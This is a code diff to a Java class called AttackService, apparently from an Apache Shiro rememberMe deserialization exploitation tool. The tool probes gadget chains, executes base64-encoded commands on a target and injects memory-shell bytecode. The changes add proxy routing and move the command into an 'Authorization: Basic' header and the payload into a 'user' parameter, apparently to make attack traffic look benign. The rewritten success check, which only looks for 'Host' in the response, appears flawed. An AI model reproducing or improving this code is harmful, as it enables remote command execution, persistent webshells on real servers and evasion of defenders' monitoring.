@@ -22,6 +22,7 @@ import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.UnsupportedEncodingException;
+import java.net.Proxy;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
 import java.util.ArrayList;
@@ -75,16 +76,17 @@ public class AttackService {
     public String headerHttpRequest(HashMap<String, String> header) {
         String result = null;
         HashMap combineHeaders = this.getCombineHeaders(header);
-
+        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
         try {
+            result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
+            if (result.contains("Host")){
+                return result;
+            }
             if (this.method.equals("GET")) {
                 result = HttpUtil.getHeaderByHttpRequest(this.url, "UTF-8", combineHeaders, this.timeout);
 
             } else {
                 result = HttpUtil.postHeaderByHttpRequest(this.url, "UTF-8", "", combineHeaders, this.timeout);
-            }
-            if (result.isEmpty()){
-                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
             }
         } catch (Exception var5) {
             this.mainController.logTextArea.appendText(Utils.log(var5.getMessage()));
@@ -97,11 +99,16 @@ public class AttackService {
     public String bodyHttpRequest(HashMap<String, String> header, String postString) {
         String result = "";
         HashMap combineHeaders = this.getCombineHeaders(header);
-
+        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
         try {
+
             if (postString.equals("")) {
+                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
+                if (result.contains("Host")){
+                    return result;
+                }
                 result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
-            } else {
+            } else if (!result.contains("Host") | !this.method.equals("GET")) {
                 result = HttpUtil.postHttpReuest(this.url, postString, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
             }
         } catch (Exception var6) {
@@ -164,9 +171,9 @@ public class AttackService {
             if (rememberMe != null) {
                 HashMap header = new HashMap();
                 header.put("Cookie", rememberMe + ";");
-                header.put("Ctmd", "08fb41620aa4c498a1f2ef09bbc1183c");
+//                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
                 String result = this.headerHttpRequest(header);
-                if (result.contains("08fb41620aa4c498a1f2ef09bbc1183c")) {
+                if (result.contains("Host")) {
                     this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
                     this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
                     this.mainController.gadgetOpt.setValue(gadgetOpt);
@@ -384,7 +391,7 @@ public class AttackService {
         HashMap<String, String> header = new HashMap();
         header.put("Cookie", attackRememberMe);
         String b64Command = Base64.encodeToString(command.getBytes(StandardCharsets.UTF_8));
-        header.put("c", b64Command);
+        header.put("Authorization", "Basic "+b64Command);
         String responseText = this.bodyHttpRequest(header, "");
         String result = responseText.split("\\$\\$\\$")[1];
         if (!result.equals("")) {
@@ -413,7 +420,7 @@ public class AttackService {
 
             try {
                 String b64Bytecode = MemBytes.getBytes(memShellType);
-                String postString = "dy=" + b64Bytecode;
+                String postString = "user=" + b64Bytecode;
                 String result = this.bodyHttpRequest(header, postString);
                 if (result.contains("->|Success|<-")) {
                     String httpAddress = Utils.UrlToDomain(this.url);
